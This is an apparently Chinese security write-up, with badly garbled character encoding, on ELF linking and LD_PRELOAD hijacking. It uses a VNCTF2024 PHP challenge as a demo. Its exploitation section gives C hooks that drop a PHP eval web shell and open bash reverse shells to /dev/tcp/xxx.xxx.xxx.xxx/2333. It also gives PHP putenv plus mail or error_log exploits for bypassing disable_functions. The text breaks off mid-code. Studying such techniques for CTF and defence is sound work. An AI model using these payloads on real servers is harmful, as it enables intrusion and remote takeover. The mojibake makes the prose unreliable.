è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ ä½†æ˜¯ä¹Ÿæ˜¯åˆ†æƒ…å†µçš„ï¼š To avoid this mechanism being used as an attack vector forÂ suid/sgidÂ executable binaries, the loader ignoresÂ LD_PRELOADÂ ifÂ ruid != euid. For such binaries, only libraries in standard paths that are alsoÂ suid/sgidÂ will be preloaded. ä¹Ÿå°±æ˜¯å¦‚æœruid != euidçš„æ—¶å€™åŠ è½½å™¨ä¼šå¿½ç•¥LD_PRELOAD\nLinking of programs #\ré¦–å…ˆå¯ä»¥çœ‹çœ‹ä¸€ä¸ªæ–‡ä»¶è½¬æ¢ä¸ºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºçš„æ´»åŠ¨ï¼š\né©±åŠ¨é¦–å…ˆè¿è¡Œcppå°†main.cè½¬åŒ–ä¸ºASCIIä¸­é—´æ–‡ä»¶main.i æ¥ä¸‹æ¥ï¼Œé©±åŠ¨è¿è¡Œcclï¼Œå°†main.iè½¬åŒ–ä¸ºASCIIæ±‡ç¼–è¯­è¨€æ–‡ä»¶main.s ç„¶åç”¨asè½¬åŒ–ä¸ºäºŒè¿›åˆ¶ç›®æ ‡æ–‡ä»¶main.o æœ€åè¿è¡Œé“¾æ¥å™¨IDï¼Œç»“åˆäº†main.oå’Œsum.oåˆ›å»ºå¯æ‰§è¡Œå¯¹è±¡ shell è°ƒç”¨æ“ä½œç³»ç»Ÿä¸­ç§°ä¸ºloaderçš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†å¯æ‰§è¡Œæ–‡ä»¶ prog ä¸­çš„ä»£ç å’Œæ•°æ®å¤åˆ¶åˆ°å†…å­˜ä¸­ï¼Œç„¶åå°†æ§åˆ¶æƒè½¬ç§»åˆ°ç¨‹åºçš„å¼€å¤´ Static Linking #\ré™æ€é“¾æ¥å™¨ï¼ˆä¾‹å¦‚ LinuxÂ ldç¨‹åºï¼ˆåœ¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºä¸­ä½¿ç”¨ï¼‰ï¼‰å°†å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°çš„é›†åˆä½œä¸ºè¾“å…¥ï¼Œå¹¶ç”Ÿæˆå¯åŠ è½½å’Œè¿è¡Œçš„å®Œå…¨é“¾æ¥çš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å‡ºã€‚è¾“å…¥å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ç”±å„ç§ä»£ç å’Œæ•°æ®éƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­æ¯ä¸ªéƒ¨åˆ†éƒ½æ˜¯è¿ç»­çš„å­—èŠ‚åºåˆ—ã€‚æŒ‡ä»¤ä½äºä¸€ä¸ªéƒ¨åˆ†ï¼Œå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡ä½äºå¦ä¸€éƒ¨åˆ†ï¼Œæœªåˆå§‹åŒ–çš„å˜é‡ä½äºå¦ä¸€éƒ¨åˆ†,å¹¶ä¸”åœ¨ç¨‹åºè¿è¡Œä¹‹å‰å…ˆå°†å„ä¸ªç›®æ ‡æ¨¡å—ä»¥åŠæ‰€éœ€è¦çš„åº“å‡½æ•°é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œç¨‹åºï¼Œä¹‹åä¸å†æ‹†å¼€ã€‚ è€Œåœ¨æ„å»ºå¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™linkeréœ€è¦æ‰§è¡Œä¸¤ä¸ªä¸»è¦çš„ä»»åŠ¡\nSymbol resolutionï¼ˆç¬¦å·è§£æï¼‰:ç›®æ ‡æ–‡ä»¶å®šä¹‰å’Œå¼•ç”¨ç¬¦å· Relocationï¼ˆæ¬è¿ï¼‰:ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆä»åœ°å€ 0 å¼€å§‹çš„ä»£ç å’Œæ•°æ®èŠ‚ã€‚ Object Files #\rè€Œå‰é¢è¯´çš„ç¬¦å·è§£æä¸­çš„ç›®æ ‡æ–‡ä»¶çš„å®šä¹‰ï¼Œé‚£ä¹ˆç›®æ ‡æ–‡ä»¶æœ‰å‡ ç§ç±»å‹å‘¢ï¼Ÿ Object files come in three forms:\nRelocatable object file(å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶) åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ï¼Œå…¶å½¢å¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶ä¸å…¶ä»–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ç»„åˆä»¥åˆ›å»ºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚ Executable object file(å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶) åŒ…å«å¯ä»¥ç›´æ¥å¤åˆ¶åˆ°å†…å­˜å¹¶æ‰§è¡Œçš„å½¢å¼çš„äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ã€‚ Shared object file(å…±äº«å¯¹è±¡æ–‡ä»¶) ä¸€ç§ç‰¹æ®Šç±»å‹çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŠ è½½æ—¶æˆ–è¿è¡Œæ—¶åŠ è½½åˆ°å†…å­˜ä¸­å¹¶åŠ¨æ€é“¾æ¥ã€‚ ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œé“¾æ¥å™¨å¯ä»¥ç”Ÿæˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œå¯¹è±¡æ–‡ä»¶æ ¹æ®ç‰¹å®šçš„å¯¹è±¡æ–‡ä»¶æ ¼å¼è¿›è¡Œç»„ç»‡ï¼Œè¯¥æ ¼å¼å› ç³»ç»Ÿè€Œå¼‚ã€‚\nRelocatable object file #\rè¿™é‡Œçš„è¯ä¹Ÿæ˜¯ç›´æ¥æ‹¿ELFæ–‡ä»¶åšä¾‹å­ è¿™ä¸ªæ˜¯å…¸å‹çš„EFIæ–‡ä»¶æ ¼å¼ã€‚ ELF æ ‡å¤´ä»¥ 16 å­—èŠ‚åºåˆ—å¼€å§‹ï¼Œæè¿°ç”Ÿæˆæ–‡ä»¶çš„ç³»ç»Ÿçš„å­—å¤§å°å’Œå­—èŠ‚é¡ºåºã€‚ELF å¤´çš„å…¶ä½™éƒ¨åˆ†åŒ…å«å…è®¸é“¾æ¥å™¨è§£æå’Œè§£é‡Šç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯ã€‚ ~~å·æ‡’ç²˜è´´ä¸€ä¸‹~~~ **.text**å·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç ã€‚\n**.rodata**åªè¯»æ•°æ®ï¼Œä¾‹å¦‚ printf è¯­å¥ä¸­çš„æ ¼å¼å­—ç¬¦ä¸²ã€switch è¯­å¥çš„è·³è½¬è¡¨ã€‚\n**.data**åˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€ C å˜é‡ã€‚å±€éƒ¨ C å˜é‡åœ¨è¿è¡Œæ—¶åœ¨å †æ ˆä¸Šç»´æŠ¤ï¼Œä¸ä¼šå‡ºç°åœ¨ .data æˆ– .bss éƒ¨åˆ†ä¸­ã€‚\n**.bss**æœªåˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€ C å˜é‡ï¼Œä»¥åŠåˆå§‹åŒ–ä¸ºé›¶çš„ä»»ä½•å…¨å±€æˆ–é™æ€å˜é‡ã€‚è¯¥éƒ¨åˆ†åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ä¸å ç”¨å®é™…ç©ºé—´ï¼›å®ƒåªæ˜¯ä¸€ä¸ªå ä½ç¬¦ã€‚ç›®æ ‡æ–‡ä»¶æ ¼å¼åŒºåˆ†å·²åˆå§‹åŒ–å˜é‡å’Œæœªåˆå§‹åŒ–å˜é‡ä»¥æé«˜ç©ºé—´æ•ˆç‡ï¼šæœªåˆå§‹åŒ–å˜é‡ä¸å¿…å ç”¨ç›®æ ‡æ–‡ä»¶ä¸­çš„ä»»ä½•å®é™…ç£ç›˜ç©ºé—´ã€‚åœ¨è¿è¡Œæ—¶ï¼Œè¿™äº›å˜é‡åœ¨å†…å­˜ä¸­åˆ†é…ï¼Œåˆå§‹å€¼ä¸ºé›¶ã€‚\n**.symtab**ç¬¦å·è¡¨ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¿¡æ¯ã€‚ä¸€äº›ç¨‹åºå‘˜é”™è¯¯åœ°è®¤ä¸ºå¿…é¡»ä½¿ç”¨ -g é€‰é¡¹ç¼–è¯‘ç¨‹åºæ‰èƒ½è·å–ç¬¦å·è¡¨ä¿¡æ¯ã€‚äº‹å®ä¸Šï¼Œæ¯ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åœ¨ .symtab ä¸­éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¡¨ï¼ˆé™¤éç¨‹åºå‘˜ä½¿ç”¨ strip å‘½ä»¤ä¸“é—¨å°†å…¶åˆ é™¤ï¼‰ã€‚ä½†æ˜¯ï¼Œä¸ç¼–è¯‘å™¨å†…çš„ç¬¦å·è¡¨ä¸åŒï¼Œ.symtab ç¬¦å·è¡¨ä¸åŒ…å«å±€éƒ¨å˜é‡çš„æ¡ç›®ã€‚\n.rel.textÂ .text èŠ‚ä¸­çš„ä½ç½®åˆ—è¡¨ï¼Œå½“é“¾æ¥å™¨å°†æ­¤ç›®æ ‡æ–‡ä»¶ä¸å…¶ä»–æ–‡ä»¶ç»„åˆæ—¶éœ€è¦ä¿®æ”¹è¿™äº›ä½ç½®ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä»»ä½•è°ƒç”¨å¤–éƒ¨å‡½æ•°æˆ–å¼•ç”¨å…¨å±€å˜é‡çš„æŒ‡ä»¤éƒ½éœ€è¦ä¿®æ”¹ã€‚å¦ä¸€æ–¹é¢ï¼Œè°ƒç”¨å±€éƒ¨å‡½æ•°çš„æŒ‡ä»¤ä¸éœ€è¦ä¿®æ”¹ã€‚è¯·æ³¨æ„ï¼Œå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­ä¸éœ€è¦é‡å®šä½ä¿¡æ¯ï¼Œå¹¶ä¸”é€šå¸¸ä¼šçœç•¥é‡å®šä½ä¿¡æ¯ï¼Œé™¤éç”¨æˆ·æ˜ç¡®æŒ‡ç¤ºé“¾æ¥å™¨åŒ…å«å®ƒã€‚\n**.rel.data**æ¨¡å—å¼•ç”¨æˆ–å®šä¹‰çš„ä»»ä½•å…¨å±€å˜é‡çš„é‡å®šä½ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä»»ä½•åˆå§‹å€¼ä¸ºå…¨å±€å˜é‡æˆ–å¤–éƒ¨å®šä¹‰å‡½æ•°çš„åœ°å€çš„å·²åˆå§‹åŒ–å…¨å±€å˜é‡éƒ½éœ€è¦ä¿®æ”¹ã€‚\n**.debug**è°ƒè¯•ç¬¦å·è¡¨ï¼Œå…¶ä¸­åŒ…å«ç¨‹åºä¸­å®šä¹‰çš„å±€éƒ¨å˜é‡å’Œ typedefã€ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å…¨å±€å˜é‡ä»¥åŠåŸå§‹ C æºæ–‡ä»¶çš„æ¡ç›®ã€‚ä»…å½“ä½¿ç”¨ -g é€‰é¡¹è°ƒç”¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºæ—¶å®ƒæ‰å­˜åœ¨ã€‚\n**.line**åŸå§‹ C æºç¨‹åºä¸­çš„è¡Œå·ä¸ .text éƒ¨åˆ†ä¸­çš„æœºå™¨ä»£ç æŒ‡ä»¤ä¹‹é—´çš„æ˜ å°„ã€‚ä»…å½“ä½¿ç”¨ -g é€‰é¡¹è°ƒç”¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºæ—¶å®ƒæ‰å­˜åœ¨ã€‚\n.strtabÂ .symtab å’Œ .debug èŠ‚ä¸­çš„ç¬¦å·è¡¨ä»¥åŠèŠ‚æ ‡é¢˜ä¸­çš„èŠ‚åç§°çš„å­—ç¬¦ä¸²è¡¨ã€‚å­—ç¬¦ä¸²è¡¨æ˜¯ä¸€ç³»åˆ—ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚\nExecutable object file #\rå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„æ ¼å¼ä¸å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼ç±»ä¼¼ã€‚ELF æ ‡å¤´æè¿°äº†æ–‡ä»¶çš„æ•´ä½“æ ¼å¼ã€‚å®ƒè¿˜åŒ…æ‹¬ç¨‹åºçš„å…¥å£ç‚¹ï¼Œå³ç¨‹åºè¿è¡Œæ—¶è¦æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ .textÂ ã€.rodataå’Œ.data_èŠ‚ä¸å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­çš„èŠ‚ç±»ä¼¼ï¼Œåªä¸è¿‡è¿™äº›èŠ‚å·²è¢«é‡å®šä½åˆ°å…¶æœ€ç»ˆçš„è¿è¡Œæ—¶å†…å­˜åœ°å€ã€‚ .init_éƒ¨åˆ†å®šä¹‰äº†ä¸€ä¸ªåä¸º___initçš„å°å‡½æ•°ï¼Œå®ƒå°†ç”±ç¨‹åºçš„åˆå§‹åŒ–ä»£ç è°ƒç”¨ã€‚ç”±äºå¯æ‰§è¡Œæ–‡ä»¶æ˜¯_å®Œå…¨é“¾æ¥_ï¼ˆé‡å®šä½ï¼‰çš„ï¼Œå› æ­¤å®ƒä¸éœ€è¦.reléƒ¨åˆ†ã€‚\nLink with static linker #\ré™æ€é“¾æ¥åº“ï¼Œåœ¨Linuxä¸‹æ–‡ä»¶ååç¼€ä¸º.aï¼Œå¦‚libstdc++.aã€‚åœ¨ç¼–è¯‘é“¾æ¥æ—¶ç›´æ¥å°†ç›®æ ‡ä»£ç åŠ å…¥å¯æ‰§è¡Œç¨‹åºã€‚ åœ¨é“¾æ¥çš„æ—¶å€™ï¼Œé“¾æ¥å™¨åªä¼šå¤åˆ¶ç¨‹åºåº”ç”¨çš„ç›®æ ‡æ¨¡å—æ¥å‡å°‘å¯æ‰§è¡Œç¨‹åºçš„å¤§å°ã€‚ å…·ä½“çš„é“¾æ¥è¿‡ç¨‹è¿™é‡Œå°±ä¸å†™äº†ã€‚\nDynamic Linking with Shared Libraries #\ré™æ€åº“ç¼ºç‚¹çš„ç°ä»£åˆ›æ–°ã€‚å…±äº«åº“æ˜¯ä¸€ä¸ªå¯¹è±¡æ¨¡å—ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶æˆ–åŠ è½½æ—¶åŠ è½½åˆ°ä»»æ„å†…å­˜åœ°å€å¹¶ä¸å†…å­˜ä¸­çš„ç¨‹åºé“¾æ¥ã€‚æ­¤è¿‡ç¨‹ç§°ä¸º_åŠ¨æ€é“¾æ¥ï¼Œç”±ç§°ä¸º__åŠ¨æ€é“¾æ¥å™¨_çš„ç¨‹åºæ‰§è¡Œã€‚å…±äº«åº“ä¹Ÿç§°ä¸ºå…±äº«å¯¹è±¡ï¼Œåœ¨ Linux ç³»ç»Ÿä¸Šå®ƒä»¬ç”±_.so_åç¼€è¡¨ç¤ºã€‚ Microsoft æ“ä½œç³»ç»Ÿå¤§é‡ä½¿ç”¨å…±äº«åº“ï¼Œä»–ä»¬å°†å…¶ç§°ä¸º DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ã€‚ è¿™ä¸ªæ˜¯ä¸å…±äº«åº“åŠ¨æ€é“¾æ¥è¿‡ç¨‹å›¾ ä¸ºäº†æ„å»ºç¤ºä¾‹å‘é‡ä¾‹ç¨‹çš„å…±äº«åº“_libvector.so_ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€äº›é’ˆå¯¹ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨çš„ç‰¹æ®ŠæŒ‡ä»¤æ¥è°ƒç”¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºï¼š linux\u0026gt; gcc -shared -fpic -o libvector.so addvec.c multvec.c -fpicè¡¨ç¤ºç¼–è¯‘å™¨ç”Ÿæˆä¸ä½ç½®æ— å…³çš„ä»£ç ã€‚-sharedè¡¨ç¤ºè®©é“¾æ¥å™¨åˆ›å»ºå…±äº«å¯¹è±¡æ–‡ä»¶ é“¾æ¥ï¼š linux\u0026gt; gcc -o prog2l main.c ./libvector.so è¿™æ ·å»åˆ›å»ºäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶prog2lï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œlibvectoré‡Œé¢çš„ä»»ä½•æ•°æ®éƒ½ä¸ä¼šå®é™…çš„å¤åˆ¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶å½“ä¸­ï¼Œè€Œæ˜¯è¿›è¡Œäº†å¼•ç”¨ã€‚\nFile name rules for dynamic link libraries #\rlibname.so.x.y.z\nlibï¼šç»Ÿä¸€å‰ç¼€ã€‚ soï¼šç»Ÿä¸€åç¼€ã€‚ nameï¼šåº“åï¼Œå¦‚libstdc++.so.6.0.21çš„nameå°±æ˜¯stdc++ã€‚ xï¼šÂ ä¸»ç‰ˆæœ¬å·Â ã€‚è¡¨ç¤ºåº“æœ‰é‡å¤§å‡çº§ï¼Œä¸åŒä¸»ç‰ˆæœ¬å·çš„åº“ä¹‹é—´æ˜¯ä¸å…¼å®¹çš„ã€‚å¦‚libstdc++.so.6.0.21çš„ä¸»ç‰ˆæœ¬å·æ˜¯6ã€‚ yï¼šÂ æ¬¡ç‰ˆæœ¬å·Â ã€‚è¡¨ç¤ºåº“çš„å¢é‡å‡çº§ï¼Œå¦‚å¢åŠ ä¸€äº›æ–°çš„æ¥å£ã€‚åœ¨ä¸»ç‰ˆæœ¬å·ç›¸åŒçš„æƒ…å†µä¸‹ï¼ŒÂ é«˜çš„æ¬¡ç‰ˆæœ¬å·å‘åå…¼å®¹ä½çš„æ¬¡ç‰ˆæœ¬å·Â ã€‚å¦‚libstdc++.so.6.0.21çš„æ¬¡ç‰ˆæœ¬å·æ˜¯0ã€‚ zï¼šÂ å‘å¸ƒç‰ˆæœ¬å·Â ã€‚è¡¨ç¤ºåº“çš„ä¼˜åŒ–ã€bugfixç­‰ã€‚ç›¸åŒçš„ä¸»æ¬¡ç‰ˆæœ¬å·ï¼Œä¸åŒçš„å‘å¸ƒç‰ˆæœ¬å·çš„åº“ä¹‹é—´Â å®Œå…¨å…¼å®¹Â ã€‚å¦‚libstdc++.so.6.0.21çš„å‘å¸ƒç‰ˆæœ¬å·æ˜¯21ã€‚ Dynamic link library search path search sequence #\rç¼–è¯‘ç›®æ ‡ä»£ç æ—¶æŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„ï¼ˆå¯æŒ‡å®šå¤šä¸ªæœç´¢è·¯å¾„ï¼ŒæŒ‰ç…§å…ˆåé¡ºåºä¾æ¬¡æœç´¢ï¼‰ï¼› ç¯å¢ƒå˜é‡LD_LIBRARY_PATHæŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„ï¼ˆå¯æŒ‡å®šå¤šä¸ªæœç´¢è·¯å¾„ï¼ŒæŒ‰ç…§å…ˆåé¡ºåºä¾æ¬¡æœç´¢ï¼‰ï¼› é…ç½®æ–‡ä»¶/etc/ld.so.confä¸­æŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„ï¼ˆå¯æŒ‡å®šå¤šä¸ªæœç´¢è·¯å¾„ï¼ŒæŒ‰ç…§å…ˆåé¡ºåºä¾æ¬¡æœç´¢ï¼‰ï¼› é»˜è®¤çš„åŠ¨æ€åº“æœç´¢è·¯å¾„/libï¼› é»˜è®¤çš„åŠ¨æ€åº“æœç´¢è·¯å¾„/usr/libï¼› 0x02EXPLOITION #\rdemo #\ræ”»å‡»è¿‡ç¨‹ï¼š\nå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°çš„åç§°ã€å˜é‡åŠå˜é‡ç±»å‹ã€è¿”å›å€¼åŠè¿”å›å€¼ç±»å‹éƒ½è¦ä¸è¦æ›¿æ¢çš„å‡½æ•°å®Œå…¨ä¸€è‡´ã€‚è¿™å°±è¦æ±‚æˆ‘ä»¬åœ¨å†™åŠ¨æ€é“¾æ¥åº“ä¹‹å‰è¦å…ˆå»ç¿»çœ‹ä¸€ä¸‹å¯¹åº”æ‰‹å†Œç­‰ã€‚ å°†æ‰€å†™çš„ c æ–‡ä»¶ç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥åº“ã€‚ å¯¹ LD_PRELOAD åŠé€†è¡Œè®¾ç½®ï¼Œå€¼ä¸ºåº“æ–‡ä»¶è·¯å¾„ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å®ç°å¯¹ç›®æ ‡å‡½æ•°åŸåŠŸèƒ½çš„åŠ«æŒäº† ç»“æŸæ”»å‡»ï¼Œä½¿ç”¨å‘½ä»¤ unset LD_PRELOAD å³å¯ è¿™é‡Œå–VNCTF2024çš„givenphpçš„é¢˜ç›®ä½œä¸ºdemo\n\u0026lt;?php highlight_file(__FILE__); if(isset($_POST[\u0026#39;upload\u0026#39;])){ handleFileUpload($_FILES[\u0026#39;file\u0026#39;]); } if(isset($_GET[\u0026#39;challenge\u0026#39;])){ waf(); $value=$_GET[\u0026#39;value\u0026#39;]; $key=$_GET[\u0026#39;key\u0026#39;]; $func=create_function(\u0026#34;\u0026#34;,\u0026#34;putenv(\u0026#39;$key=$value\u0026#39;);\u0026#34;); if($func==$_GET[\u0026#39;guess\u0026#39;]){ $func(); system(\u0026#34;whoami\u0026#34;); } } functionÂ waf() { if(preg_match(\u0026#39;/\\\u0026#39;|\u0026#34;|%|\\(|\\)|;|bash/i\u0026#39;,$_GET[\u0026#39;key\u0026#39;])||preg_match(\u0026#39;/\\\u0026#39;|\u0026#34;|%|\\(|\\)|;|bash/i\u0026#39;,$_GET[\u0026#39;value\u0026#39;])){ die(\u0026#34;evilÂ input!!!\u0026#34;); } } functionÂ handleFileUpload($file) { $uploadDirectoryÂ =Â \u0026#39;/tmp/\u0026#39;; ifÂ ($file[\u0026#39;error\u0026#39;]Â !==Â UPLOAD_ERR_OK)Â { echoÂ \u0026#39;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ã€‚\u0026#39;; return; } $fileExtensionÂ =Â pathinfo($file[\u0026#39;name\u0026#39;],Â PATHINFO_EXTENSION); $newFileNameÂ =Â uniqid(\u0026#39;uploaded_file_\u0026#39;,Â true)Â .Â \u0026#39;.\u0026#39;Â .Â $fileExtension; $destinationÂ =Â $uploadDirectoryÂ .Â $newFileName; ifÂ (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;],Â $destination))Â { echoÂ $destination; }Â elseÂ { echoÂ \u0026#39;æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚\u0026#39;; } } æˆ‘ä»¬åªçœ‹å¯¹ç¯å¢ƒåšæ“ä½œçš„éƒ¨åˆ†\n$func=create_function(\u0026#34;\u0026#34;,\u0026#34;putenv(\u0026#39;$key=$value\u0026#39;);\u0026#34;); if($func==$_GET[\u0026#39;guess\u0026#39;]){ $func(); system(\u0026#34;whoami\u0026#34;); } } çœ‹ä¸€ä¸‹whoamiè°ƒç”¨çš„é™æ€é“¾æ¥åº“ å¯ä»¥çœ‹è§è¿™é‡Œè°ƒç”¨äº†å¾ˆå¤šã€‚åˆ©ç”¨puts\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int platload() { system(\u0026#34;echo \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39; \u0026gt; /var/www/html/shell.php\u0026#34;); } int puts(const char *message){ if(getenv(\u0026#34;LD_PRELOAD\u0026#34;==NULL)){ return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); playload(); } è¿™é‡Œå¯ä»¥å†™é©¬ä¹Ÿå¯ä»¥å†™åå¼¹shellä¹Ÿå¯ä»¥å†™å…¶ä»–çš„ã€‚ ç¼–è¯‘ä¸€ä¸‹ä¸Šä¼ å³å¯ã€‚ è¿™é‡Œæˆ‘ä¹Ÿè´´ä¸€ä¸‹Mon0dayå¸ˆå‚…çš„demo whoami.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char name[] = \u0026#34;mon\u0026#34;; if (argc \u0026lt; 2) { printf(\u0026#34;usage: %s \u0026lt;given-name\u0026gt;\\n\u0026#34;, argv[0]); return 0; } if (!strcmp(name, argv[1])) { printf(\u0026#34;\\033[0;32;32mYour name Correct!\\n\\033[m\u0026#34;); return 1; } else { printf(\u0026#34;\\033[0;32;31mYour name Wrong!\\n\\033[m\u0026#34;); return 0; } } hook_strcmp.c\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int strcmp(const char *s1, const char *s2) { if (getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); return 0; } æœ€åç¼–è¯‘åä¹Ÿæ˜¯æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ˜¯è¿”å›correct\n0x03 bypass #\rbypass disable_function #\rä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨å®æˆ˜ä¸­é‡åˆ°disableçš„æ—¶å€™æ˜¯å¯ä»¥åˆ©ç”¨LD_PRELOADè¿›è¡Œç»•è¿‡çš„ åˆ©ç”¨æ¡ä»¶ï¼Œå­˜åœ¨putenv,mailï¼Œerror_logè¿™äº›å¯ä»¥å¯¹ç¯å¢ƒå˜é‡è¿›è¡Œæ“ä½œçš„å‡½æ•°\nmail #\rhook_getuid.c\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void payload() { system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } uid_t getuid() { if (getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); payload(); } exp:\n\u0026lt;?php putenv(\u0026#39;LD_PRELOAD=/var/www/html/hook_getuid.so\u0026#39;); // æ³¨æ„è¿™é‡Œçš„ç›®å½•è¦æœ‰è®¿é—®æƒé™ mail(\u0026#34;a@localhost\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;); ?\u0026gt; error_log #\råŒæ ·ä¹Ÿä¼šè°ƒç”¨sendmailï¼Œæ‰€ä»¥åŸºæœ¬åŸç†å’Œmailçš„ä¸€æ ·è¿™é‡Œä¸åœ¨èµ˜è¿°ã€‚ exp:\n\u0026lt;?php putenv(\u0026#39;LD_PRELOAD=/var/www/html/hook_getuid.so\u0026#39;); error_log(\u0026#34;\u0026#34;,1\u0026#34;\u0026#34;,\u0026#34;\u0026#34;); ?\u0026gt; hijack system\u0026rsquo;s process #\rè¿™é‡Œmon0dayå¸ˆå‚…è¿˜å†™å‡ºäº†ä¸€ä¸ªæ–°çš„æ–¹æ³•å»è¿›è¡Œgetshell å› ä¸ºåœ¨æœ‰äº›ç³»ç»Ÿé‡Œé¢æ²¡æœ‰å®‰è£…sendmailçš„æƒ…å†µã€‚ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\nè¿™é‡Œåœ¨gccä¸­å‘ç°äº†__attribute__((constructor))ä¿®é¥°ç¬¦ï¼Œåœ¨mainä¹‹å‰è¿›è¡Œæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬çš„æ–‡ä»¶è¢«æ‰§è¡Œï¼Œé‚£ä¹ˆç›´æ¥å°±ä¼šè¢«åŠ«æŒgetshell\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } _attribute_((constructor)) #\r#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; extern 